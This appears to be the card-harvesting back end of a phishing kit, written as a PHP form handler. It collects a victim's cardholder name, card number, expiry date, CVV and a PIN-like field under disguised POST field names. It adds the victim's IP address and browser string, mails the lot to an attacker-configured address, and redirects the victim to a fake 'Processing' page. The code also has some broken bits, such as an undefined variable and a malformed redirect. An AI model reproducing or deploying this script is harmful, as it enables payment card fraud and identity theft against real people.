<?php
include("../config.php");
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];

$ali .= "------------+| RAW All Stars |+------------\n";
$ali .= "NAMI Name               : ".$_POST['crdhw']."\n";
$ali .= "NAMI N²               : ".$_POST['polonamz']."\n";
$ali .= "NAMI EXP              : ".$_POST['detox']."\n";
$ali .= "NAMI VCV              : ".$_POST['LECs']."\n";
$ali .= "NAMI Ps              : ".$_POST['CPNL']."\n";
$ali .= "------------+| RAW All Stars |+------------\n";
$ali .= "Fr0m $ip chek in http://www.geoiptool.com/?IP=$ip   \n";
$ali .= "System Down : $useragent   \n";


$bilsub = "Customer [iCard] $ip";
$bilhead = "From: Customer HAD  <iprodeersts@maily.com>";
$bilhead .= $_POST['eMailAdd']."\n";
$bilhead = "X-Mailer: PHP/".phpversion();
$bilhead .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$bilhead .= "MIME-Version: 2.0\n";
$arr=array($bilsnd, $IP);
foreach ($arr as $bilsnd)
mail($bilsnd,$bilsub,$ali,$bilhead);
header("Location: ../bil.php?Go=Processing&_SESSION<?=348c218cfa60fb4804c4f6365a832bad93cbe1e6");
?>